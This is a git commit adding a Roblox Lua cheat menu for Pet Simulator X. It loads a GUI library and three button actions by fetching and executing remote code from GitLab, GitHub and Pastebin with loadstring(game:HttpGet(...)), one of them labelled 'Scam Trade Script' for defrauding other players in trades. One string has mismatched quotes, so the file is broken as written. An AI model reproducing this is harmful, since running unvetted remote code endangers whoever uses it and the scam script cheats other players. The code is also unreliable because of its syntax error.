f53a23cd4ffffc5ba74ac74cc786948237b7d063
kimigop1827 <113401505+kimigop1827@users.noreply.github.com>
2022-11-08 20:51:41 +0800

    script

---
+++ hiroshi.lua
@@ -0,0 +1,8 @@
+local gui = loadstring(game:HttpGet("https://gitlab.com/0x45.xyz/droplib/-/raw/master/drop-minified.lua"))():Init(config,game.CoreGui)
+
+
+local lpg = gui:CreateCategory("HiroshiKim - Pet Simulator X")
+
+lpg:CreateButton("New Script No Key "Fast Hatch" ")",function() loadstring(game:HttpGet("https://raw.githubusercontent.com/IlllIlIIIlllIlIlllIIlIlllIlIIlllI/EggHatch/main/Egg.txt", true))(); end)
+lpg:CreateButton("Pet Sim X Script",function() loadstring(game:HttpGet("https://raw.githubusercontent.com/lovelyang/roblox/main/psx_d.lua"))(); end)
+lpg:CreateButton("Scam Trade Script",function() loadstring(game:HttpGet("https://pastebin.com/raw/ufuSCGK2"))(); end)
